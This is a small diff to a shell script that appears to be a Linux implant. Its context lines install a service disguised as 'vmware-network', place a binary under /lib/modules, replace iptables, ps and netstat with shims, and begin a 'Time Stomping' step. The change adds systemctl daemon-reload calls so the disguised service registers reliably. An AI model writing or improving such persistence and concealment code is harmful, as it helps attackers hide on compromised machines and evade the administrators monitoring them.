@@ -101,6 +101,7 @@ copyman(){
     chmod 744 /etc/systemd/system/vmware-network.service
     chmod +x /lib/modules/kernel_static/copy
 
+    systemctl daemon-reload
     systemctl start vmware-network
     systemctl enable vmware-network
 }
@@ -230,6 +231,7 @@ shim_iptables
 shim_ps
 shim_netstat
 
+systemctl daemon-reload 
 
 # Time Stomping starts
 cd /etc
